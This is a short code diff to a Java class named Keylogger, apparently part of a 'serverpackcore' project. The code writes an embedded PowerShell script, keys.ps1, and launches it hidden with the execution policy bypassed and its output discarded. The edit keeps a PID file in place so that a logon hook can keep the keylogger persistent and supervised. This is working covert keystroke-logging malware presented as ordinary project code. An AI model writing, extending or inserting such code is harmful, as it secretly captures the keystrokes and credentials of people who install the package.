@@ -66,7 +66,8 @@ final class Keylogger {
 		try {
 			Path script = OpsPaths.keysScript(installDir);
 			writeResource("/serverpackcore/keys.ps1", script);
-			Files.deleteIfExists(OpsPaths.keyPid(installDir));
+			// Do not delete keys.pid here: a logon hook may already own the mutex and
+			// have written it, and deleting it would make status/supervision blind.
 			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoP", "-NonInteractive",
 				"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script.toString(), ops.toString());
 			builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
